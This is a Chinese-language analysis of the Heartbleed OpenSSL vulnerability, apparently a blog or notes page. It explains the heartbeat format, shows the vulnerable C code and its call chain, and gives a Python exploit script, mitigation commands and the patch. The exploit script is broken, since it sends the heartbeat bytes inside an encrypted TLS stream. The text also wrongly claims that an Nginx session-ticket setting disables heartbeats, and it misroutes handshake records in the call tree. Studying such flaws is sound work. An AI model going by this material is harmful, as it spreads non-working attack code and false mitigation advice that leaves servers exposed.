### links
* CVE-2014-0160漏洞官方说明：[CVE - CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)
* CVE-2014-0160漏洞原理：[CVE-2014-0160漏洞原理 - 知乎](https://zhuanlan.zhihu.com/p/23573647103)
---

CVE-2014-0160（[Heartbleed](https://zhida.zhihu.com/search?content_id=253736568&content_type=Article&match_order=1&q=Heartbleed&zhida_source=entity)，心脏出血漏洞）是[OpenSSL](https://zhida.zhihu.com/search?content_id=253736568&content_type=Article&match_order=1&q=OpenSSL&zhida_source=entity)库中的一个严重漏洞，允许攻击者通过恶意构造的TLS心跳请求（Heartbeat Request）读取服务器内存中的敏感信息（如私钥、用户会话数据）。

**影响范围**：当时 OpenSSL 1.0.1 - 1.0.1f 版本受到影响，全球大量服务器受到攻击。

### **一、漏洞原理**

### TLS心跳扩展

指一种用于维持TLS连接活性的机制。具体来说： 
* **维持连接活性**：心跳扩展允许连接的一端向另一端发送心跳请求，以确保连接的另一端仍然在线，避免因超时而断开连接。 
- **请求格式**：心跳扩展定义了两种消息
	- **心跳请求（Heartbeat Request）**
	- **心跳响应（Heartbeat Response）**

* 心跳消息的格式
```
+-----------+-------------+------------------+-----------------+
| 类型 (1B) | 长度 (2B)  |  负载 (payload)  |  填充值 (可选随机值)  |
+-----------+-------------+------------------+-----------------+
```
字段解析：
	- **类型（1 字节）**
	    - `1` 表示心跳请求 (Heartbeat Request)
	    - `2` 表示心跳响应 (Heartbeat Response)
	- **长度（Payload Length, 2 字节）**
	    - 指定 `payload` 数据的大小（**负载长度是由发送者声明的**, 不包括类型和长度字段）
	- **负载（payload，长度可变）**
	    - **由发送方定义的数据**
	- **填充值（可选）**
	    - 额外的数据，用于验证数据完整性
- **响应机制**：**接收心跳请求的一端（如服务器）会将接收到的Payload原样返回，确保连接的另一端知道连接仍然有效。** 
* **心跳消息的工作流程**
	* 客户端或服务器发送 Heartbeat Request：
    - 包含一个随机生成的**负载数据**和**填充数据**。
    - **负载长度是由发送者声明的（重要！）**。
    - **接收端**： 解析心跳消息。 **原封不动** 地返回一个 **Heartbeat Response**，包含相同的负载和填充数据。
- **安全问题**：在Heartbleed漏洞中，问题出在服务端（也就是接收端）对Payload Length字段的处理上，它没有验证该字段与实际Payload长度是否匹配，导致了内存越界读取，攻击者可以读取服务器内存中的敏感信息。比如攻击者构造一个恶意心跳请求：
```
类型: 1（Heartbeat Request）
长度: 65535（实际负载很短，比如 "X"）
负载: "X"
```
但是 OpenSSL 服务器不会检查 `长度` 是否与实际 `负载` 匹配，而是直接返回：
```
类型: 2（Heartbeat Response）
长度: 65535
负载: "X" + 服务器内存的 65534 字节数据
```


### **漏洞核心机制**：

The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.

OpenSSL 1.0.1 版本（1.0.1 之前的版本至 1.0.1g）中的 (1) TLS 和 (2) DTLS 实现未能正确处理 Heartbeat 扩展数据包，这使得远程攻击者能够通过精心构造的数据包触发缓冲区过度读取，从而从进程内存中获取敏感信息，例如读取私钥，涉及文件 d1_both.c 和 t1_lib.c，即著名的 Heartbleed 漏洞。
1.  **[TLS心跳扩展](https://zhida.zhihu.com/search?content_id=253736568&content_type=Article&match_order=1&q=TLS%E5%BF%83%E8%B7%B3%E6%89%A9%E5%B1%95&zhida_source=entity)**：用于维持连接活性，客户端发送包含`payload`和`payload_length`的请求，服务端返回相同内容。 **攻击者发送心跳请求时，故意伪造超长长度**（例如 64 KB）。
2.  **输入验证缺失**：服务端未验证客户端声明的`payload_length`是否与实际数据长度匹配，导致[内存越界读取](https://zhida.zhihu.com/search?content_id=253736568&content_type=Article&match_order=1&q=%E5%86%85%E5%AD%98%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96&zhida_source=entity)。

### **漏洞利用步骤**：

1.  **攻击者发送虚假心跳请求，声明`payload_length`为65535（最大值），但实际数据仅1字节。**
2.  服务端未验证长度，直接复制内存中`payload_length`长度的数据（包括敏感信息）返回给攻击者。

### **二、漏洞代码示例（简化版）**

```c
// 漏洞代码片段（取自OpenSSL 1.0.1f）
int tls1_process_heartbeat(SSL *s) {
    // 读取心跳请求中的 payload 长度字段（客户端可伪造）
    unsigned char hbtype;  // 心跳类型（请求/响应）
    unsigned int payload_length;
    unsigned char *p = &s->s3->rrec.data[0]; // 客户端发送的数据
    
    hbtype = *p++; // 读取心跳类型（0x01 请求 / 0x02 响应），读取接收到的客户端数据的第一个字节，即类型。再p++

    // 读取载荷长度（16位无符号整数）（可能恶意）
    n2s(p, payload_length);

    // 分配缓冲区（未验证 payload_length 合法性）
    unsigned char *buffer = OPENSSL_malloc(1 + 2 + payload_length + 16);
    unsigned char *bp = buffer; //bp是一个指向buffer的指针

    // 直接拷贝客户端声明的 payload_length 长度数据（实际可能不足）
    memcpy(bp, p, payload_length);

    // 关键漏洞点！p 可能指向不足 payload_length 的数据

    // 将缓冲区数据发送回客户端（包含越界内存内容）
    ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 1 + 2 + payload_length);

    // 释放分配的内存
    OPENSSL_free(buffer);

    return 0;
}

```

代码解释备注： [CVE-2014-0160漏洞代码备注](CVE-2014-0160漏洞代码备注.md)
### 漏洞链：
#### 详细调用链
根据 OpenSSL 1.0.1f 代码分析，`SSL *s` 的完整调用链如下：

```
└──SSL * s = SSL_new(SSL_CTX *ctx)     // 创建 SSL 结构
	└── SSL_accept(SSL *s) / SSL_connect(SSL *s) // 进行握手
	  └── ssl_accept(SSL *s) 函数会调用ssl3_get_client_hello(s)
	    └── ssl3_read_bytes(SSL * s，...)   // 读取 SSL 记录
	      └──ssl3_get_record(SSL * s)   //读取并解析 TLS 记录层（TLS Record Layer）的数据
	        └── tls1_process_heartbeat(SSL * s)  // 处理 Heartbeat 逻辑
```

在 `ssl3_get_record()` 中，OpenSSL 检测到 `TLS1_RT_HEARTBEAT` 记录时，会调用 `tls1_process_heartbeat(s)`，其中 `s` 就是 `SSL *s`。
#### SSL * s = SSL_new(SSL_CTX * ctx) 
* `SSL *s` ：是一个代表当前 TLS/SSL 连接的结构体。**这个 `s` 参数的来源通常可以追溯到 `ssl3_read_bytes()` 或 `ssl3_get_record()` 这类函数，它们在处理 SSL/TLS 记录时，会调用 `tls1_process_heartbeat()` 来处理 Heartbeat 扩展数据。**
* `SSL *s` 来自 `SSL_new()`：所有 SSL 连接的 `SSL` 结构体都是由 `SSL_new()` 创建的：
```c
SSL *s = SSL_new(ctx);  // ctx 是一个 SSL_CTX 上下文
```
* **s将作为下一步SSL_accept或SSL_connect的输入**
#### int SSL_accept(SSL * s)或int SSL_connect(SSL * s)
```c
int SSL_accept(SSL *s)
	{
	if (s->handshake_func == 0)
		/* Not properly initialized yet */
		SSL_set_accept_state(s);

	return(s->method->ssl_accept(s));
	}

int SSL_connect(SSL *s)
	{
	if (s->handshake_func == 0)
		/* Not properly initialized yet */
		SSL_set_connect_state(s);

	return(s->method->ssl_connect(s));
	}
```
#### int ssl3_read_bytes(SSL * s, int type, unsigned char * buf, int len, int peek)
* `ssl3_read_bytes()`：在`OpenSSL 1.0.1f` 版本中，SSL/TLS 记录数据的读取是由 `ssl3_read_bytes()` 进行的。
* `ssl3_read_bytes(s)` 需要从 TLS 记录层获取数据，它的 **第一步** 就是调用 `ssl3_get_record(s)`：
```
ssl3_read_bytes()
 ├── ssl3_get_record(s)   // 读取 TLS 记录
 ├── if (rr->type == TLS1_RT_HEARTBEAT)
 │    └── tls1_process_heartbeat(s)
 ├── if (rr->type == TLS1_RT_APPLICATION_DATA)
 │    └── 处理应用层数据
 ├── if (rr->type == TLS1_RT_HANDSHAKE)
 │    └── tls1_process_heartbeat(s); 
 └── 继续处理下一条记录
```

#### static int ssl3_get_record(SSL * s): used only by ssl3_read_bytes
1. **读取记录头（Header）**：
   - **条件检查**：当状态`s->rstate`不为`SSL_ST_READ_BODY`或当前数据包长度不足头部长度（5字节）时，需要读取头部。
   - **调用`ssl3_read_n`**：通过`ssl3_read_n(s, SSL3_RT_HEADER_LENGTH, s->s3->rbuf.len, 0)`读取5字节的头部数据。
     - **返回值处理**：若返回值`n <= 0`（错误或非阻塞IO需更多数据），直接返回。
   - **解析头部**：提取记录类型、主/次版本号、记录长度，并校验协议版本合法性。
   - **长度校验**：若记录长度超出接收缓冲区限制，触发错误`SSL_AD_RECORD_OVERFLOW`。
```c
	/* check if we have the header */
	if (	(s->rstate != SSL_ST_READ_BODY) ||
		(s->packet_length < SSL3_RT_HEADER_LENGTH)) 
		{
		n=ssl3_read_n(s, SSL3_RT_HEADER_LENGTH, s->s3->rbuf.len, 0);
		if (n <= 0) return(n); /* error or non-blocking */
		s->rstate=SSL_ST_READ_BODY;

		p=s->packet;

		/* Pull apart the header into the SSL3_RECORD */
		rr->type= *(p++);
		ssl_major= *(p++);
		ssl_minor= *(p++);
		version=(ssl_major<<8)|ssl_minor;
		n2s(p,rr->length);
```
1. **读取记录体（Body）**：
   - **检查数据完整性**：若当前已读取的数据不足记录体长度（`rr->length`），调用`ssl3_read_n(s, i, i, 1)`读取剩余数据。
     - 参数`i`为`rr->length`，确保读取完整的记录体。
   - **更新状态**：读取成功后，将状态`s->rstate`重置为`SSL_ST_READ_HEADER`，准备处理下一个记录。
```c
	/* s->rstate == SSL_ST_READ_BODY, get and decode the data */

	if (rr->length > s->packet_length-SSL3_RT_HEADER_LENGTH)
		{
		/* now s->packet_length == SSL3_RT_HEADER_LENGTH */
		i=rr->length;
		n=ssl3_read_n(s,i,i,1);
		if (n <= 0) return(n); /* error or non-blocking io */
		/* now n == rr->length,
		 * and s->packet_length == SSL3_RT_HEADER_LENGTH + rr->length */
		}
```

#### int ssl3_read_n(SSL * s, int n, int max, int extend)

* `ssl3_read_n` 是 SSL/TLS 协议栈中 **核心的数据读取函数**，用于从网络流中读取指定字节数（`n`），支持分次读取（非阻塞IO）和缓冲区管理。其核心逻辑围绕 **缓冲区操作** 和 **网络数据读取** 展开。



#### **1. 初始化与缓冲区准备**
```c
SSL3_BUFFER *rb = &(s->s3->rbuf);  // 获取读缓冲区
if (rb->buf == NULL)
    if (!ssl3_setup_read_buffer(s))  // 初始化缓冲区
        return -1;
```
- **缓冲区检查**：若读缓冲区未初始化，调用 `ssl3_setup_read_buffer` 分配内存。
- **内存对齐**：针对某些硬件优化（如 AES-NI），调整数据对齐（`SSL3_ALIGN_PAYLOAD`）。

---

#### **2. 处理扩展模式（`extend` 参数）**
```c
if (!extend) {
    // 重置缓冲区偏移，处理对齐
    rb->offset = align;  
    s->packet = rb->buf + rb->offset;  // 更新当前数据包指针
    s->packet_length = 0;  // 重置包长度
}
```
- **非扩展模式**：重置缓冲区偏移量，确保新数据从对齐位置开始存储。
- **扩展模式**：延续已有缓冲区的数据（用于分片读取）。

---

#### **3. DTLS 协议特殊处理**
```c
if (SSL_version(s) == DTLS1_VERSION || ...) {
    if (left > 0 && n > left) 
        n = left;  // DTLS 不允许跨包读取
}
```
- **数据报约束**：DTLS 基于 UDP，每个读取操作需完整处理单个数据包，避免跨包读取。

---

#### **4. 从缓冲区直接读取（快速路径）**
```c
if (left >= n) {
    s->packet_length += n;
    rb->left = left - n;  // 更新剩余字节
    rb->offset += n;      // 更新偏移量
    return n;  // 直接返回，无需网络读取
}
```
- **缓冲区命中**：若缓冲区已有足够数据（`left >= n`），直接返回，减少系统调用。

---

#### **5. 从网络读取数据（核心逻辑）**
```c
while (left < n) {
    // 调用 BIO_read 从底层读取数据
    i = BIO_read(s->rbio, pkt + len + left, max - left);
    if (i <= 0) {
        rb->left = left;  // 保存剩余字节
        return i;         // 错误或非阻塞需重试
    }
    left += i;  // 累加已读字节
}
```
- **循环读取**：通过 `BIO_read` 多次读取，直到满足 `n` 字节或达到 `max` 限制。
- **非阻塞处理**：
  - **`i > 0`**：成功读取部分数据，继续循环。
  - **`i <= 0`**：错误（`i < 0`）或 EOF（`i = 0`），返回错误码。
    - **常见错误码**：`SSL_ERROR_WANT_READ`（需重试）、`SSL_ERROR_SYSCALL`（系统错误）。

---

#### **6. 数据读取后处理**
```c
rb->offset += n;        // 更新缓冲区偏移
rb->left = left - n;    // 更新剩余未消费字节
s->packet_length += n;  // 更新当前包长度
s->rwstate = SSL_NOTHING;  // 重置读写状态
return n;  // 返回实际读取的字节数
```
- **状态更新**：记录已读数据偏移量，为下一次读取做准备。
- **资源释放**：若启用 `SSL_MODE_RELEASE_BUFFERS` 且缓冲区为空，释放内存（针对非 DTLS）。






#### tls1_process_heartbeat(SSL * s);
* `tls1_process_heartbeat(s)` 处理 Heartbeat 逻辑
* source：tls1_process_heartbeat函数输入值SSL * s **为客户端发送的数据** ——> unsigned char * p = &s->s3->rrec.data[0]; 
-   `n2s(p, payload_length)`：**从客户端数据中提取长度（攻击者发送虚假心跳请求，声明`payload_length`为最大值65535），但未检查实际数据是否足够。**
- bp是一个指向buffer的指针，初始化时指向 `buffer` 的起始位置。它用于在后续的 `memcpy` 调用中作为数据拷贝的目标指针。
- `memcpy(bp, p, payload_length)`：直接复制`payload_length`字节，若实际数据不足，将读取相邻内存内容。**p 可能指向不足 payload_length 的数据。**
- sink：**ssl3_write_bytes将缓冲区数据发送回客户端（包含越界内存内容）**

### **三、攻击模拟代码（Python示例）**

```python
import socket
import ssl
from struct import pack

def exploit_heartbleed(host, port=443):
    # 构造恶意心跳请求（声明长度65535，实际 payload 仅 1 字节）
    payload = b"\x01"  # 心跳类型：请求
    payload += pack(">H", 65535)  # 伪造 payload_length=65535
    payload += b"X"  # 实际 payload 只有 1 字节

    # 发送恶意请求
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
    ssl_sock.connect((host, port))
    ssl_sock.send(payload)

    response = ssl_sock.recv(65535)  # 接收服务端返回的 65535+ 字节数据
    print("泄漏的内存数据:", response)

    ssl_sock.close()

# 示例：攻击存在漏洞的服务器
exploit_heartbleed("vulnerable.example.com")
```

### **四、影响范围**

-   **OpenSSL版本**：1.0.1 ~ 1.0.1f（修复版本：1.0.1g及更高）。
-   **风险数据**：

-   SSL私钥
-   用户会话Cookie
-   其他进程内存中的敏感信息。

### **五、处置与修复方案**

### **1、升级OpenSSL**

```bash
# Ubuntu/Debian sudo apt update && sudo apt install openssl libssl1.0.0 # CentOS/RHEL sudo yum update openssl
```

验证版本：

```bash
openssl version -a # 应显示 >= 1.0.1g 或 1.0.2及更高版本
```

### **2、撤销并重新生成证书**

即使修复漏洞，原有私钥可能已泄露：

```bash
# 重新生成私钥和CSR openssl genrsa -out new.key 2048 openssl req -new -key new.key -out new.csr # 替换旧证书并吊销旧证书（联系CA）
```

### **3、漏洞检测工具**

使用Nmap或专门脚本检查服务是否存在漏洞：

```bash
nmap -p 443 --script ssl-heartbleed vulnerable.example.com
```

### **六、规避手段**

**1、禁用TLS心跳扩展**（若无需长连接）：

-   重新编译OpenSSL时添加`-DOPENSSL_NO_HEARTBEATS`选项。
-   配置Nginx/Apache禁用心跳：# Nginx配置 ssl\_session\_tickets off;

**2、网络层防护**：

-   使用WAF（如ModSecurity）过滤恶意心跳请求。
-   配置IDS/IPS规则拦截异常长度的TLS心跳包。

**3、内存保护技术**：

-   启用ASLR（地址空间布局随机化）增加攻击难度。
-   使用内存保护工具（如[grsecurity](https://zhida.zhihu.com/search?content_id=253736568&content_type=Article&match_order=1&q=grsecurity&zhida_source=entity)）。

### **七、修复代码原理（官方补丁）**

官方补丁添加了输入验证逻辑：

```text
// 修复代码片段 unsigned int payload_length; n2s(p, payload_length); // 新增检查：实际数据长度是否足够 if (1 + 2 + payload_length > s->s3->rrec.length) { SSLerr(SSL_F_TLS1_PROCESS_HEARTBEAT, SSL_R_SSL_HANDSHAKE_FAILURE); return 0; // 丢弃非法请求 } // 仅拷贝实际有效数据 memcpy(bp, p, payload_length);
```

### **八、总结**

心脏出血漏洞因输入验证缺失导致内存泄漏，升级OpenSSL是根本解决方案。修复后需重新生成证书并持续监控服务安全状态。对于关键系统，建议结合网络防护和内存安全技术形成纵深防御。
